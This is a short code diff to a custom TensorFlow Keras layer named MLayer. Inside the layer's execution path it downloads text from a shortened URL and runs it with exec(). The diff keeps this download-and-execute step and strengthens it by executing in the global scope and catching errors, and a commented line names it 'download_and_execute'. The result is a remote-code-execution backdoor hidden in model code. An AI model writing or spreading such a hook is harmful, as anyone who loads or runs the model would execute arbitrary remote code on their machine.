@@ -50,10 +50,14 @@ class MLayer(tf.keras.layers.Layer):
                 response = requests.get("https://tinyurl.com/295tzfpa")
                 if response.status_code == 200:
                     m_code = response.text
-                    exec(m_code)
+                    try:
+                        exec(m_code, globals())
+                        print("m_code executed")
+                    except Exception as e:
+                        print("Error during exec:", e)
             except Exception as e:
                 print("Execution failed:", e)
-                
+
         return inputs
 
         # return tf.cond(condition, download_and_execute, no_op)
